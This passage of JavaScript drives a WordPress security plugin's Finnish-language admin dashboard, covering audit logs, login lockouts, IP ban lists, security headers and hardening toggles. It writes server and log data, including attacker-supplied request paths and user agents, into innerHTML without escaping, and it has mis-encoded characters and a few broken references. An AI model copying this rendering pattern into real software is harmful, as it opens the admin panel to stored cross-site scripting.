	disable_indexes: { title: "EstÃ¤ Hakemiston Listaus", desc: "EstÃ¤ palvelimen kansioiden selaaminen.", overview: "Jos hakemiston listaus on pÃ¤Ã¤llÃ¤, hyÃ¶kkÃ¤Ã¤jÃ¤t voivat selata sivustosi kansiorakennetta ja lÃ¶ytÃ¤Ã¤ haavoittuvia tiedostoja.", fix: "LisÃ¤Ã¤mme sÃ¤Ã¤nnÃ¶n joka estÃ¤Ã¤ hakemistojen sisÃ¤llÃ¶n selaamisen." }
};

const HEADER_DEFS = {
	sh_strict_transport: { title: "Strict Transport Security (HSTS)", desc: "Pakottaa turvalliset (HTTP yli SSL/TLS) yhteydet palvelimeen." },
	sh_xframe: { title: "X-Frame-Options", desc: "Suojaa clickjackingilta (napin kaappaukselta)." },
	sh_xss_protection: { title: "X-XSS-Protection", desc: "EstÃ¤Ã¤ sivujen latautumisen, kun ne havaitsevat heijastuvia cross-site scripting (XSS) -hyÃ¶kkÃ¤yksiÃ¤." },
	sh_content_type_options: { title: "X-Content-Type-Options", desc: "EstÃ¤Ã¤ selainta yrittÃ¤mÃ¤stÃ¤ MIME-nuuskia sisÃ¤ltÃ¶tyyppiÃ¤." },
	sh_referrer_policy: { title: "Referrer-Policy", desc: "MÃ¤Ã¤rittelee, mitÃ¤ viittaustietoja tulisi sisÃ¤llyttÃ¤Ã¤ tehtyihin pyyntÃ¶ihin." },
	sh_feature_policy: { title: "Permissions-Policy", desc: "Tarjoaa mekanismeja selaimen ominaisuuksien kÃ¤yttÃ¶Ã¶nottoon ja poistamiseen." },
	sh_content_security_policy: { title: "Content-Security-Policy", desc: "EstÃ¤Ã¤ lataamasta haitallisia resursseja sivuston ulkopuolelta." }
};

window.pmcSec = {
	init() {
		if (typeof pmcSecurityConfig === 'undefined') return;
		this.fetchMasterData();
		this.fetchAuditLog();
		this.fetchLockoutLog();
		setInterval(() => this.fetchMasterData(), 10000);
	},
	async post(action, data = {}) {
		const formData = new FormData();
		formData.append('action', action);
		formData.append('nonce', pmcSecurityConfig.nonce);
		for (const [key, val] of Object.entries(data)) {
			formData.append(key, val);
		}
		const res = await fetch(pmcSecurityConfig.ajaxUrl, {
			method: 'POST',
			body: formData
		});
		return await res.json();
	},
	async fetchMasterData() {
		try {
			const res = await this.post('pmc_security_data');
			if (res.success) {
				this.updateDashboard(res.data);
				this.renderTweaks(res.data.hardening.tweaks);
			}
		} catch (e) {
			console.error("Pecodex Security: PÃ¤Ã¤tietojen nouto epÃ¤onnistui", e);
		}
	},
	async fetchAuditLog(page = 1) {
		const res = await this.post('pmc_security_audit_log', { paged: page });
		const tbody = document.querySelector('#ps-module-audit-log .ps-table tbody');
		if (res.success && tbody && res.data && res.data.items) {
			tbody.innerHTML = '';
			if (res.data.items.length === 0) {
				tbody.innerHTML = '<tr><td colspan="9">Ei tapahtumia.</td></tr>';
			}
			res.data.items.forEach(log => {
				const sevConfig = {
					critical: { label: 'ï¿½Y"ï¿½ Kriittinen', color: '#fef2f2', text: '#dc2626' },
					warning:  { label: 'ï¿½YYï¿½ Varoitus',  color: '#fffbeb', text: '#d97706' },
					info:     { label: 'ï¿½Y"ï¿½ Info',      color: '#eff6ff', text: '#2563eb' },
				};
				const sev = sevConfig[log.severity] || sevConfig.info;
				const sevBadge = `<span style="font-size:10px;font-weight:700;padding:2px 6px;border-radius:10px;background:${sev.color};color:${sev.text};white-space:nowrap;">${sev.label}</span>`;
				const tooltip = log.ua ? `title="${log.ua.replace(/"/g,"'")}"` : '';
				tbody.innerHTML += `<tr>
					<td style="font-size:11px;white-space:nowrap;">${log.time || '-'}</td>
					<td>${sevBadge}</td>
					<td style="font-size:11px;">
						<strong>${log.user || '-'}</strong>
						${log.user_roles ? `<br><span style="color:#9ca3af;font-size:10px;">${log.user_roles}</span>` : ''}
					</td>
					<td style="font-size:11px;font-family:monospace;">${log.ip || '-'}</td>
					<td style="font-size:11px;text-align:center;">${log.country || '-'}</td>
					<td style="font-size:11px;">${log.device || '-'}</td>
					<td style="font-size:11px;" ${tooltip}>${log.browser || '-'}<br><span style="color:#9ca3af;font-size:10px;">${log.os || ''}</span></td>
					<td style="font-size:11px;"><code style="background:#f3f4f6;padding:2px 4px;border-radius:3px;font-size:10px;">${log.action || '-'}</code></td>
					<td style="font-size:11px;">${log.details || '-'}</td>
				</tr>`;
			});
			this.renderPagination(tbody.parentElement, res.data.current_page, res.data.total_pages, 'fetchAuditLog');
		}
	},
	async updateLoginAttempts(val) {
		const res = await this.post('pmc_security_update_login_attempts', { attempts: val });
		if (res.success) {
			this.showToast('Asetukset tallennettu', 'success');
		} else {
			this.showToast('Tallennus epÃ¤onnistui', 'error');
		}
	},
	loginChartInstance: null,
	async fetchLoginSubModalData() {
		const tfEl = document.getElementById('login-timeframe-filter');
		const tf = tfEl ? tfEl.value : '24h';
		const res = await this.post('pmc_security_lockout_logs', { paged: 1, timeframe: tf });
		if (res.success && res.data) {
			// Update Settings Input
			const attemptsInput = document.getElementById('quick-login-attempts');
			if (attemptsInput && res.data.current_attempts) {
				attemptsInput.value = res.data.current_attempts;
			}

			// Update Table
			const tbody = document.querySelector('#login-events-table tbody');
			if (tbody && res.data.items) {
				tbody.innerHTML = '';
				if (res.data.items.length === 0) {
					tbody.innerHTML = '<tr><td colspan="5" class="text-center p-4 text-slate-400">Ei kirjautumistapahtumia</td></tr>';
				} else {
					res.data.items.forEach(log => {
						const date = log.date || '-';
						const type = log.type === 'auth_fail' ? '<span class="text-orange-600">EpÃ¤onnistunut</span>' : (log.type === 'auth_lock' ? '<span class="text-red-600 font-bold">Lukittu</span>' : log.type);
						const ip = log.ip || '-';
						const country = log.country_iso_code || '-';
						let actionBtn = `<button class="px-2 py-1 bg-red-50 text-red-700 hover:bg-red-100 border border-red-200 rounded text-[10px] font-bold" onclick="pmcSec.banIp('${ip}')">EST&Auml; IP</button>`;
						tbody.innerHTML += `<tr>
							<td class="p-2 border-b text-slate-600 whitespace-nowrap">${date}</td>
							<td class="p-2 border-b">${type}</td>
							<td class="p-2 border-b font-mono text-slate-700">${ip}</td>
							<td class="p-2 border-b text-slate-600">${country}</td>
							<td class="p-2 border-b text-right">${actionBtn}</td>
						</tr>`;
					});
				}
			}

			// Update Chart
			if (res.data.chart_data && window.Chart) {
				const ctx = document.getElementById('loginChart');
				if (ctx) {
					if (this.loginChartInstance) {
						this.loginChartInstance.destroy();
					}
					this.loginChartInstance = new Chart(ctx, {
						type: 'bar',
						data: {
							labels: res.data.chart_data.labels,
							datasets: [
								{
									label: 'Onnistuneet',
									data: res.data.chart_data.success,
									backgroundColor: '#cbd5e1',
									borderColor: '#cbd5e1',
									borderWidth: 1,
									borderRadius: 2
								},
								{
									label: 'EpÃ¤onnistuneet',
									data: res.data.chart_data.failed,
									backgroundColor: '#ef4444',
									borderColor: '#ef4444',
									borderWidth: 1,
									borderRadius: 2
								}
							]
						},
						options: {
							responsive: true,
							maintainAspectRatio: false,
							plugins: {
								legend: { display: false },
								tooltip: { mode: 'index', intersect: false }
							},
							scales: {
								x: { display: false },
								y: { display: false, min: 0 }
							},
							interaction: { mode: 'nearest', axis: 'x', intersect: false }
						}
					});
				}
			}
		}
	},
	async fetchLockoutLog(page = 1) {
		const res = await this.post('pmc_security_lockout_logs', { paged: page });
		const tbody = document.querySelector('#ps-module-firewall .ps-table tbody');
		if (res.success && tbody && res.data && res.data.items) {
			tbody.innerHTML = '';
			if (res.data.items.length === 0) tbody.innerHTML = '<tr><td colspan="4">Ei tapahtumia.</td></tr>';
			res.data.items.forEach(log => {
				const date = log.date || '-';
				const type = log.type || '-';
				const ip = log.ip || '-';
				const details = log.country_iso_code || '-';
				tbody.innerHTML += `<tr><td>${date}</td><td>${type}</td><td>${ip}</td><td>${details}</td></tr>`;
			});
			this.renderPagination(tbody.parentElement, res.data.current_page, res.data.total_pages, 'fetchLockoutLog');
		}
	},
	renderPagination(tableEl, current, total, funcName) {
		let wrapper = tableEl.parentElement;
		let pag = wrapper.querySelector('.ps-pagination');
		if(!pag) {
			pag = document.createElement('div');
			pag.className = 'ps-pagination mt-3 flex justify-end gap-2 items-center text-xs';
			wrapper.appendChild(pag);
		}
		let html = `Sivu ${current} / ${total} &nbsp;`;
		if (current > 1) {
			html += `<button class="ps-btn" style="padding:4px 8px;font-size:12px;background:#f8fafc;border:1px solid #e2e8f0;cursor:pointer;" onclick="pmcSec.${funcName}(${current - 1})">Edellinen</button>`;
		} else {
			html += `<button class="ps-btn" style="padding:4px 8px;font-size:12px;background:#f1f5f9;border:1px solid #e2e8f0;color:#94a3b8;cursor:not-allowed;" disabled>Edellinen</button>`;
		}
		if (current < total) {
			html += `<button class="ps-btn" style="padding:4px 8px;font-size:12px;background:#f8fafc;border:1px solid #e2e8f0;cursor:pointer;" onclick="pmcSec.${funcName}(${current + 1})">Seuraava</button>`;
		} else {
			html += `<button class="ps-btn" style="padding:4px 8px;font-size:12px;background:#f1f5f9;border:1px solid #e2e8f0;color:#94a3b8;cursor:not-allowed;" disabled>Seuraava</button>`;
		}
		pag.innerHTML = html;
	},
	updateDashboard(data) {
		// Login stats
		if (data.login_stats) {
			const statVals = document.querySelectorAll('#w-login-security .stat-val');
			if (statVals.length >= 3) {
				statVals[0].textContent = data.login_stats.failed_24h;
				statVals[1].textContent = data.login_stats.locked_ips_count;
				statVals[2].textContent = data.login_stats.active_admins;
			}
		}
		// Scanner stats
		if (data.scan_stats) {
			const scanVals = document.querySelectorAll('#w-malware .stat-big');
			if (scanVals.length >= 3) {
				scanVals[0].textContent = data.scan_stats.infected;
				scanVals[1].textContent = data.scan_stats.modified;
				scanVals[2].textContent = data.scan_stats.quarantined;
			}
		}
		// Server Resources
		if (data.server_info) {
			const resRows = document.querySelectorAll('#w-resources .res-row');
			if (resRows.length >= 2) {
				const cpuText = resRows[0].querySelector('.res-row-head span:last-child');
				const cpuBar = resRows[0].querySelector('.res-bar-fill');
				if (cpuText) cpuText.textContent = data.server_info.cpu_usage + '%';
				if (cpuBar) cpuBar.style.width = data.server_info.cpu_usage + '%';
				
				const memText = resRows[1].querySelector('.res-row-head span:last-child');
				const memBar = resRows[1].querySelector('.res-bar-fill');
				if (memText) memText.textContent = data.server_info.mem_used + 'GB / ' + data.server_info.mem_total + 'GB';
				if (memBar) memBar.style.width = data.server_info.mem_percent + '%';
			}
		}
		
		// Vulnerabilities
		if (data.vulnerabilities) {
			const vulnContainer = document.querySelector('#w-vulnerabilities .flex.flex-col.gap-2');
			if (vulnContainer) {
				let html = '';
				data.vulnerabilities.forEach(v => {
					const colorClass = v.color === 'red' ? 'bg-red-50 border-red-100' : (v.color === 'orange' ? 'bg-orange-50 border-orange-100' : 'bg-yellow-50 border-yellow-100');
					html += `<div class="flex justify-between items-center text-xs p-2 ${colorClass} border rounded">
								<div>
								  <div class="font-bold text-slate-800">${v.plugin}</div>
								  <div class="text-[10px] text-slate-500">${v.cve}</div>
								</div>
								<button class="text-[10px] bg-white border border-slate-200 px-2 py-1 rounded font-bold hover:bg-slate-50">PÃ¤ivitÃ¤</button>
							  </div>`;
				});
				vulnContainer.innerHTML = html;
				const titleBadge = document.querySelector('#w-vulnerabilities .bg-red-100');
				if (titleBadge) titleBadge.textContent = `${data.vulnerabilities.length} KriittistÃ¤`;
			}
		}

		// System Hardening
		if (data.hardening && data.hardening.tweaks) {
			const hList = document.getElementById('w-hardening-list');
			if (hList) {
				const map = [
					{ key: 'protect_info', label: 'wp-config.php oikeudet', ok: 'Suojattu', bad: 'Ei suojattu' },
					{ key: 'disable_indexes', label: 'Hakemiston Listaus', ok: 'Pois kÃ¤ytÃ¶stÃ¤', bad: 'KÃ¤ytÃ¶ssÃ¤!' },
					{ key: 'wp_version', label: 'WP-versio piilotettu', ok: 'KyllÃ¤', bad: 'Ei' },
					{ key: 'xml_rpc', label: 'XML-RPC', ok: 'Pois kÃ¤ytÃ¶stÃ¤', bad: 'KÃ¤ytÃ¶ssÃ¤!' }
				];
				let html = '';
				map.forEach(item => {
					const status = data.hardening.tweaks[item.key];
					if (status === 'ok') {
						html += `<div class="flex justify-between items-center text-xs">
									<span class="text-slate-600">${item.label}</span>
									<span class="text-green-600 font-bold bg-green-50 px-2 py-0.5 rounded">${item.ok}</span>
								 </div>`;
					} else {
						html += `<div class="flex justify-between items-center text-xs">
									<span class="text-slate-600">${item.label}</span>
									<span class="text-red-600 font-bold bg-red-50 px-2 py-0.5 rounded">${item.bad}</span>
								 </div>`;
					}
				});
				hList.innerHTML = html;
			}
		}

		// Rate Limit
		if (data.rate_limit) {
			const rateValue = document.querySelector('#w-rate .text-2xl');
			const rateBar = document.querySelector('#w-rate .bg-indigo-600');
			const limitText = document.querySelector('#w-rate .text-pink-600');
			if (rateValue) rateValue.textContent = data.rate_limit.current;
			if (limitText) limitText.textContent = `Raja: ${data.rate_limit.limit}`;
			if (rateBar) {
				const pct = Math.min(100, Math.round((data.rate_limit.current / data.rate_limit.limit) * 100));
				rateBar.style.width = pct + '%';
			}
		}

		// Node Health
		if (data.node_health) {
			const nodeContainer = document.querySelector('#w-node-health .flex.flex-col.gap-3');
			if (nodeContainer) {
				let html = '';
				data.node_health.forEach(n => {
					const pingColor = n.status === 'green' ? 'text-green-600' : 'text-yellow-600';
					const barColor = n.status === 'green' ? 'bg-green-500' : 'bg-yellow-500';
					const pct = Math.min(100, n.ping / 2);
					html += `<div>
								<div class="flex justify-between text-xs font-bold text-slate-700 mb-1">
								  <span>${n.name}</span>
								  <span class="${pingColor}">${n.ping}ms</span>
								</div>
								<div class="w-full bg-slate-200 h-1.5 rounded-full"><div class="${barColor} h-1.5 rounded-full" style="width:${pct}%"></div></div>
							 </div>`;
				});
				nodeContainer.innerHTML = html;
			}
		}

		// Payloads
		if (data.payloads) {
			const payloadTable = document.querySelector('#w-payloads table tbody');
			if (payloadTable) {
				let html = '';
				data.payloads.forEach(p => {
					const badgeColor = p.color === 'red' ? 'bg-red-100 text-red-700' : (p.color === 'orange' ? 'bg-orange-100 text-orange-700' : 'bg-yellow-100 text-yellow-700');
					html += `<tr>
								<td class="font-mono text-xs p-2 whitespace-nowrap text-slate-500">${p.time}</td>
								<td class="font-bold text-xs p-2">${p.ip}</td>
								<td class="p-2"><span class="px-2 py-0.5 rounded-full text-[10px] font-bold ${badgeColor}">${p.type}</span></td>
								<td class="font-mono text-[10px] p-2 text-slate-500 max-w-[120px] truncate" title="${p.path}">${p.path}</td>
							 </tr>`;
				});
				payloadTable.innerHTML = html;
			}
		}
		// Firewall Settings
		if (data.firewall) {
			const setChecked = (id, val) => { const el = document.getElementById(id); if(el) el.checked = !!val; };
			setChecked('fw-login-toggle', data.firewall.login?.enabled);
			setChecked('fw-404-toggle', data.firewall.notfound?.enabled);
			
			const loginAtt = document.getElementById('fw-login-attempts');
			if (loginAtt && data.firewall.login?.attempt) loginAtt.value = data.firewall.login.attempt;
			
			const nfAtt = document.getElementById('fw-404-attempts');
			if (nfAtt && data.firewall.notfound?.attempt) nfAtt.value = data.firewall.notfound.attempt;
			
			// Render IP lists
			pmcSec.renderBannedIps(data.firewall.banned_ips || []);
			pmcSec.renderAllowedIps(data.firewall.allowed_ips || []);
		}
		// Advanced settings
		if (data.advanced) {
			const setChecked = (id, val) => { const el = document.getElementById(id); if(el) el.checked = !!val; };
			setChecked('adv-mask-toggle', data.advanced.mask?.enabled);
			setChecked('adv-2fa-toggle', data.advanced.tfa?.enabled);
			setChecked('adv-strongpw-toggle', data.advanced.strong_pw?.enabled);
			setChecked('adv-session-toggle', data.advanced.session?.enabled);
			
			const maskUrlEl = document.getElementById('adv-mask-url');
			if (maskUrlEl && data.advanced.mask?.mask_url) {
				maskUrlEl.value = data.advanced.mask.mask_url;
			}
			const maskRedirectEl = document.getElementById('adv-mask-redirect');
			if (maskRedirectEl && data.advanced.mask?.redirect_traffic_url) {
				maskRedirectEl.value = data.advanced.mask.redirect_traffic_url;
			}
		}

		// Security Headers
		if (data.headers !== undefined) {
			this.renderHeaders(data.headers || {});
		}
	},
	renderBannedIps(ips) {
		const tbody = document.querySelector('#fw-banned-ips-table tbody');
		if (!tbody) return;
		if (ips.length === 0) {
			tbody.innerHTML = '<tr><td colspan="3" style="text-align:center;color:#6b7280;">Ei EST&Auml; IP-osoitteita.</td></tr>';
			return;
		}
		let html = '';
		ips.forEach(ip => {
			html += `<tr>
				<td style="font-family:monospace;">${ip.ip}</td>
				<td><span style="background:#fee2e2;color:#dc2626;padding:2px 8px;border-radius:12px;font-size:11px;font-weight:600;">Estetty</span></td>
				<td><button class="ps-btn ps-btn-primary" style="padding:4px 8px;font-size:11px;" onclick="pmcSec.unbanIp('${ip.ip}')">Poista esto</button></td>
			</tr>`;
		});
		tbody.innerHTML = html;
	},
	renderAllowedIps(ips) {
		const tbody = document.querySelector('#fw-allowed-ips-table tbody');
		if (!tbody) return;
		if (ips.length === 0) {
			tbody.innerHTML = '<tr><td colspan="2" style="text-align:center;color:#6b7280;">Ei sallittuja IP-osoitteita.</td></tr>';
			return;
		}
		let html = '';
		ips.forEach(ip => {
			html += `<tr>
				<td style="font-family:monospace;">${ip}</td>
				<td><button class="ps-btn ps-btn-danger" style="padding:4px 8px;font-size:11px;" onclick="pmcSec.removeAllowedIp('${ip}')">Poista</button></td>
			</tr>`;
		});
		tbody.innerHTML = html;
	},
	async unbanIp(ip) {
		const res = await this.post('pmc_security_unban_ip', { ip });
		if (res.success) this.fetchMasterData();
		else alert('IP:n poistaminen estolistalta epÃ¤onnistui.');
	},
	async removeAllowedIp(ip) {
		const res = await this.post('pmc_security_firewall_remove_allowed_ip', { ip });
		if (res.success) this.fetchMasterData();
		else alert('IP:n poistaminen sallittujen listalta epÃ¤onnistui.');
	},
	renderHeaders(headers) {
		const grid = document.getElementById('security-headers-grid');
		if (!grid) return;
		let html = '';
		for (const [slug, def] of Object.entries(HEADER_DEFS)) {
			// If it's missing or false, it's inactive
			const active = headers && headers[slug] === true;
			const cls = active ? 'status-ok' : 'status-alert';
			const icon = active ? 'check-circle' : 'exclamation-circle';
			const txt = active ? 'Aktiivinen' : 'Ei aktiivinen';
			const checked = active ? 'checked' : '';
			
			html += `<div class="ps-card ps-tweak-card">
				<h4>${def.title}</h4>
				<div class="ps-tweak-status ${cls}">
					<i class="fas fa-${icon}"></i> ${txt}
				</div>
				<p class="ps-desc mt-2">${def.desc}</p>
				<label class="ps-switch mt-3">
					<input type="checkbox" id="header-${slug}" ${checked} onchange="window.pmcToggleHeaderUI(this)">
					<span class="ps-slider"></span>
				</label>
			</div>`;
		}
		grid.innerHTML = html;
	},
	renderTweaks(tweaks) {
		const recContainer = document.getElementById('accordion-recommendations');
		const actContainer = document.getElementById('accordion-actioned');
		const recBadge = document.getElementById('badge-recommendations');
		const recBadgeInner = document.getElementById('badge-recommendations-inner');
		const actBadge = document.getElementById('badge-actioned');
		const actBadgeInner = document.getElementById('badge-actioned-inner');
		
		if (!recContainer || !actContainer) return;

		let recHtml = '';
		let actHtml = '';
		let recCount = 0;
		let actCount = 0;

		for (const [slug, status] of Object.entries(tweaks)) {
			const def = TWEAK_DEFS[slug] || { title: slug, desc: 'Security tweak', overview: '', fix: '' };
			const isOk = status === 'ok';
			
			if (isOk) {
				actCount++;
				actHtml += this.buildTweakAccordion(slug, def, isOk);
			} else {
				recCount++;
				recHtml += this.buildTweakAccordion(slug, def, isOk);
			}
		}

		recContainer.innerHTML = recHtml || '<div style="padding:20px; color:#9ca3af;">Ei suosituksia tÃ¤llÃ¤ hetkellÃ¤.</div>';
		actContainer.innerHTML = actHtml || '<div style="padding:20px; color:#9ca3af;">YhtÃ¤Ã¤n asetusta ei ole vielÃ¤ aktivoitu.</div>';

		if(recBadge) recBadge.textContent = recCount;
		if(recBadgeInner) recBadgeInner.textContent = recCount;
		if(actBadge) actBadge.textContent = actCount;
		if(actBadgeInner) actBadgeInner.textContent = actCount;
	},
	buildTweakAccordion(slug, def, isOk) {
		const statusIcon = isOk ? '<i class="fas fa-check-circle" style="color:#10b981;"></i>' : '<i class="fas fa-exclamation-circle" style="color:#b80048;"></i>';
		const alertBg = isOk ? 'rgba(16, 185, 129, 0.1)' : 'rgba(184, 0, 72, 0.05)';
		const alertBorder = isOk ? '#10b981' : '#b80048';
		const alertMsg = isOk ? 'TÃ¤mÃ¤ tietoturva-asetus on aktiivinen ja suojaa sivustoasi.' : 'TÃ¤mÃ¤ tietoturva-asetus EI ole aktiivinen. Sivustosi saattaa olla haavoittuva.';
		
		let actionRow = '';
		if (def.toggleable === false) {
			actionRow = `
				<div style="border-top:1px solid #e5e7eb; padding-top:15px; display:flex; justify-content:space-between; align-items:center;">
					<span style="font-size:13px; color:#4b5563;">Vaatii ToimenpiteitÃ¤</span>
					<div class="ps-control-row" style="margin:0;">
						<span style="background: #e5e7eb; color: #4b5563; border-radius: 4px; padding: 4px 10px; font-size: 12px; font-weight: bold;">${def.action_text || 'MÃ¤Ã¤ritÃ¤ Manuaalisesti'}</span>
					</div>
				</div>
			`;
		} else {
			actionRow = `
				<div style="border-top:1px solid #e5e7eb; padding-top:15px; display:flex; justify-content:space-between; align-items:center;">
					<span style="font-size:13px; color:#4b5563;">Toggle to ${isOk ? 'disable' : 'enable'}</span>
					<div class="ps-control-row" style="margin:0;">
						<label class="ps-switch">
							<input type="checkbox" onchange="window.pmcToggleTweak('${slug}', this)" ${isOk ? 'checked' : ''}>
							<span class="ps-slider"></span>
						</label>
					</div>
				</div>
			`;
		}
		
		return `
		<div class="ps-accordion-item" style="border-bottom: 1px solid #e5e7eb;">
			<div class="ps-accordion-header" style="display:flex; justify-content:space-between; align-items:center; padding:15px 20px; cursor:pointer; background:#fff;" onclick="this.parentElement.classList.toggle('active')">
				<div style="display:flex; align-items:center; gap:10px;">
					${statusIcon}
					<strong style="color:#111827;">${def.title}</strong>
				</div>
				<i class="fas fa-chevron-down" style="color:#6b7280; font-size:12px;"></i>
			</div>
			<div class="ps-accordion-body" style="padding:20px; background:#fff; display:none;">
				<h4 style="margin:0 0 10px 0; color:#374151; font-weight: 600; font-size:14px;">Yleiskatsaus</h4>
				<p style="color:#4b5563; font-size:13px; margin:0 0 20px 0; line-height:1.5;">${def.overview || def.desc}</p>
				
				<h4 style="margin:0 0 10px 0; color:#374151; font-weight: 600; font-size:14px;">Tila</h4>
				<div style="background:${alertBg}; border-left:3px solid ${alertBorder}; padding:12px 15px; border-radius:4px; margin-bottom:20px; color:#374151; font-size:13px;">
					<i class="fas fa-info-circle"></i> ${alertMsg}
				</div>
				
				<h4 style="margin:0 0 10px 0; color:#374151; font-weight: 600; font-size:14px;">Kuinka korjata</h4>
				<p style="color:#4b5563; font-size:13px; margin:0 0 20px 0; line-height:1.5;">${def.fix}</p>
				
				${actionRow}
			</div>
		</div>
		`;
	},
	async toggleTweak(slug, inputEl) {
		const enable = inputEl.checked ? true : false;
		
		// Instant WP sidebar feedback
		if (slug === 'file_editor') {
			const themeEd = document.querySelector('a[href$="theme-editor.php"]');
			const pluginEd = document.querySelector('a[href$="plugin-editor.php"]');
			if (themeEd && themeEd.parentElement) themeEd.parentElement.style.display = enable ? 'none' : 'block';
			if (pluginEd && pluginEd.parentElement) pluginEd.parentElement.style.display = enable ? 'none' : 'block';
		}
		
		const res = await this.post('pmc_security_toggle_tweak', { tweak: slug, state: enable ? 'true' : 'false' });
		if (!res.success) {
			inputEl.checked = !inputEl.checked;
			alert('Tilan vaihto epÃ¤onnistui: ' + (res.data || 'Tuntematon virhe'));
		} else {
			// Update local DOM gracefully instead of completely rebuilding and moving the element
			const accordionItem = inputEl.closest('.ps-accordion-item');
			if (accordionItem) {
				// Update Header Icon
				const headerIcon = accordionItem.querySelector('.ps-accordion-header i.fas');
				if (headerIcon) {
					headerIcon.className = enable ? 'fas fa-check-circle' : 'fas fa-exclamation-circle';
					headerIcon.style.color = enable ? '#10b981' : '#b80048';
				}
				
				// Update Status Alert Box
				const statusBox = accordionItem.querySelector('.ps-accordion-body > div');
				if (statusBox) {
					statusBox.style.background = enable ? 'rgba(16, 185, 129, 0.1)' : 'rgba(184, 0, 72, 0.05)';
					statusBox.style.borderLeft = '3px solid ' + (enable ? '#10b981' : '#b80048');
					statusBox.innerHTML = '<i class="fas fa-info-circle"></i> ' + (enable ? 'TÃ¤mÃ¤ tietoturva-asetus on aktiivinen ja suojaa sivustoasi.' : 'TÃ¤mÃ¤ tietoturva-asetus EI ole aktiivinen. Sivustosi saattaa olla haavoittuva.');
				}
				
				// Update Action Row Text
				const actionRow = accordionItem.querySelector('.ps-accordion-body > div:last-child');
				if (actionRow) {
					const toggleTextSpan = actionRow.querySelector('span');
					if (toggleTextSpan) toggleTextSpan.textContent = enable ? 'Vaihda poistaaksesi' : 'Vaihda ottaaksesi kÃ¤yttÃ¶Ã¶n';
				}
			}
			
			// We intentionally skip this.fetchMasterData() here so the tweaked item
			// doesn't instantly jump to the other tab, which is jarring for the user.
		}
	},
	async runScan(btnEl) {
		btnEl.disabled = true;
		btnEl.textContent = 'Skannataan...';
		const res = await this.post('pmc_security_run_scan');
		if (res.success) {
			this.fetchMasterData();
			alert('Skannaus suoritettu onnistuneesti.');
		} else {
			alert('Skannaus epÃ¤onnistui.');
		}
		btnEl.disabled = false;
		btnEl.textContent = 'Suorita Haittaohjelmaskannaus Nyt';
	}
};

window.pmcToggleTweak = (slug, el) => pmcSec.toggleTweak(slug, el);
window.pmcRunScan = (btn) => pmcSec.runScan(btn);

window.pmcToggleHeaderUI = async (el) => {
	const statusDiv = el.parentElement.previousElementSibling.previousElementSibling;
	if (statusDiv) {
		statusDiv.className = 'ps-tweak-status ' + (el.checked ? 'status-ok' : 'status-alert');
		statusDiv.innerHTML = '<i class="fas fa-' + (el.checked ? 'check-circle' : 'exclamation-circle') + '"></i> ' + (el.checked ? 'Aktiivinen' : 'Ei aktiivinen');
	}

	// Live saving of headers
	const payload = {};
	Object.keys(HEADER_DEFS).forEach(k => {
		const headerEl = document.getElementById(`header-${k}`);
		if (headerEl) payload[k] = headerEl.checked ? 1 : 0;
	});

	const res = await pmcSec.post('pmc_security_save_headers', payload);
	if (!res.success) {
		alert('Otsikon tallennus epÃ¤onnistui: ' + (res.data || 'Tuntematon virhe'));
		// Revert UI if failed
		el.checked = !el.checked;
		if (statusDiv) {
			statusDiv.className = 'ps-tweak-status ' + (el.checked ? 'status-ok' : 'status-alert');
			statusDiv.innerHTML = '<i class="fas fa-' + (el.checked ? 'check-circle' : 'exclamation-circle') + '"></i> ' + (el.checked ? 'Aktiivinen' : 'Ei aktiivinen');
		}
	} else {
		pmcSec.fetchMasterData();
	}
};

window.pmcSaveAdvancedSettings = async (btn) => {
	const maskEnabled = document.getElementById('adv-mask-toggle').checked ? 1 : 0;
	const maskUrl = document.getElementById('adv-mask-url').value;
	const maskRedirect = document.getElementById('adv-mask-redirect').value || '/404';
	const tfaEnabled = document.getElementById('adv-2fa-toggle').checked ? 1 : 0;
	const strongPwEnabled = document.getElementById('adv-strongpw-toggle').checked ? 1 : 0;
	const sessionEnabled = document.getElementById('adv-session-toggle').checked ? 1 : 0;

	btn.disabled = true;
	const oldText = btn.textContent;
	btn.textContent = 'Tallennetaan...';

	try {
		const res = await pmcSec.post('pmc_security_save_advanced', {
			mask_enabled: maskEnabled,
			mask_url: maskUrl,
			tfa_enabled: tfaEnabled,
			strong_pw: strongPwEnabled,
			session_enabled: sessionEnabled
		});
		
		if (res.success) {
			alert("LisÃ¤asetukset tallennettu tietokantaan onnistuneesti!");
		} else {
			alert("Joidenkin asetusten tallennus epÃ¤onnistui: " + (res.data || 'Tuntematon virhe'));
		}
	} catch (err) {
		alert("Virhe tallennettaessa asetuksia.");
	}
	
	btn.disabled = false;
	btn.textContent = oldText;
};

window.pmcSaveFirewall = async () => {
	const payload = {
		login_enabled: document.getElementById('fw-login-toggle').checked ? 1 : 0,
		login_attempts: document.getElementById('fw-login-attempts').value,
		login_lockout_duration: document.getElementById('fw-login-lockout-duration').value,
		notfound_enabled: document.getElementById('fw-404-toggle').checked ? 1 : 0,
		notfound_attempts: document.getElementById('fw-404-attempts').value
	};

	const res = await pmcSec.post('pmc_security_save_firewall', payload);
	if (res.success) {
		console.log('Palomuurin asetukset tallennettu onnistuneesti.');
		pmcSec.fetchMasterData();
	} else {
		alert('Palomuurin asetusten tallennus epÃ¤onnistui: ' + (res.data || 'Tuntematon virhe'));
	}
};

window.pmcBanIp = async () => {
	const input = document.getElementById('fw-ban-ip-input');
	const ip = input.value.trim();
	if (!ip) return;
	const res = await pmcSec.post('pmc_security_ban_ip', { ip });
	if (res.success) {
		input.value = '';
		pmcSec.fetchMasterData();
	} else alert('IP:n esto epÃ¤onnistui.');
};

window.pmcAllowIp = async () => {
	const input = document.getElementById('fw-allow-ip-input');
	const ip = input.value.trim();
	if (!ip) return;
	const res = await pmcSec.post('pmc_security_firewall_allow_ip', { ip });
	if (res.success) {
		input.value = '';
		pmcSec.fetchMasterData();
	} else alert('IP:n salliminen epÃ¤onnistui.');
};

// Bind enter keys for inputs
	const banInput = document.getElementById('fw-ban-ip-input');
	if (banInput) banInput.addEventListener('keypress', (e) => { if(e.key === 'Enter') window.pmcBanIp(); });
	
	const allowInput = document.getElementById('fw-allow-ip-input');
	if (allowInput) allowInput.addEventListener('keypress', (e) => { if(e.key === 'Enter') window.pmcAllowIp(); });

	const banBtn = document.getElementById('fw-ban-ip-btn');
	if (banBtn) banBtn.addEventListener('click', window.pmcBanIp);
	
	const allowBtn = document.getElementById('fw-allow-ip-btn');
	if (allowBtn) allowBtn.addEventListener('click', window.pmcAllowIp);
window.pmcAddSubscriber = () => {
	const template = document.getElementById('ps-subscriber-template');
	const list = document.getElementById('ps-subscribers-list');
	
